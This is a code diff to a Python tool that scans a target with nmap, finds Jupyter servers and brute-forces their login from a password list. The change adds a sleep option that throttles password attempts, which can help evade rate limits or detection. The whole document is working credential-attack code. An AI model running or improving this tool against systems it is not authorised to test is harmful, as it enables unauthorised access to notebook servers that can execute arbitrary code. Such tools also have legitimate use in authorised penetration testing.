@@ -29,6 +29,7 @@ import os
 import re
 import sys
 from termcolor import colored
+import time
 
   
 def args():
@@ -45,9 +46,13 @@ def args():
 							action='store', required=True, 
 							help='File with passwords for brute forcing...')
 
+	my_parser.add_argument('-s', '--sleep', dest='sleep', action='store',
+						    default=0,
+							help='Amount of seconds to sleep between password tries, default 0')
+	
 	return(my_parser.parse_args())
 
-def brute_login(ip, port, pass_file):
+def brute_login(ip, port, pass_file, sleep_s):
 	url = ('http://' + ip + ':' + str(port))
 	print("...Testing URL:", url)
 
@@ -81,6 +86,7 @@ def brute_login(ip, port, pass_file):
 					p = "...Password Found -> " + password
 					return(colored(p, 'cyan'))
 
+				time.sleep(int(sleep_s))
 			return(colored("...No password found!"))
 
 		else:
@@ -95,6 +101,7 @@ def main():
 
 	ip = myargs.ip
 	password_file = myargs.password_file
+	sleep_sec = myargs.sleep
 
 	try:
 	    nm = nmap.PortScanner()         # instantiate nmap.PortScanner object
@@ -112,7 +119,7 @@ def main():
 		if re.search(pattern, (nm[ip]['tcp'][port]['cpe'])):
 			print("\nFound potential Jupyter Server on: " + str(port))
 			# print("---", nm[ip]['tcp'][port]['cpe'], "\n")
-			status = (brute_login(ip, port, password_file))
+			status = (brute_login(ip, port, password_file, sleep_sec))
 			print(status)
 
 
